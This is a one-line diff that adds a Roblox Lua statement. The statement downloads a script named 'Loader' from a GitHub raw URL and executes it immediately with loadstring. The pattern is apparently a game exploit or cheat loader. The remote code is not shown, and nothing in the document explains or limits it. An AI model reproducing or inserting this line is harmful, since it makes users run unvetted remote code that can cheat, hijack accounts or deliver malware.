@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm501/My-Arab-Scripts/refs/heads/main/Loader'))() 
